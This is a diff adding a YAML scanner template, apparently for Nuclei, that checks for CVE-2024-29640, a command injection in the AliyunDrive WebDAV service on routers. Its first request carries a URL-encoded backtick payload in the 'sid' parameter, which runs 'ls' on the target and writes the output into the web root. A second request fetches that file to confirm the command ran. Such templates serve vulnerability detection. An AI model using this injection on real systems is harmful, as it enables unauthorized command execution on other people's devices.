@@ -1,0 +1,43 @@
+id: aliyundrive-webdav-command-injection
+
+info:
+  name: AliyunDrive WebDAV 服务命令注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    阿里云盘 WebDAV 服务为支持 Infuse、nPlayer 等客户端 App 提供视频流媒体访问功能，允许设备端直接读取云存储视频内容并实现本地播放。该服务在 2.3.3 及更早版本中，其协议实现层存在命令注入缺陷。攻击者可通过构造恶意请求，在目标系统执行任意命令。
+  reference:
+  - CVE-2024-29640
+  tags: aliyundrive
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /cgi-bin/luci/admin/services/aliyundrive-webdav/query?sid=%60%6c%73%20%2f%3e%2f%77%77%77%2f%31%32%33%2e%74%78%74%60 HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: sysauth=41273cb2cffef0bb5d0653592624cf64
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+    Connection: close
+- raw:
+  - |
+    GET /123.txt HTTP/1.1
+    Host: {{Hostname}}
+    
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'token'
+  - type: word
+    part: body
+    words:
+    - 'html'
+    negative: true
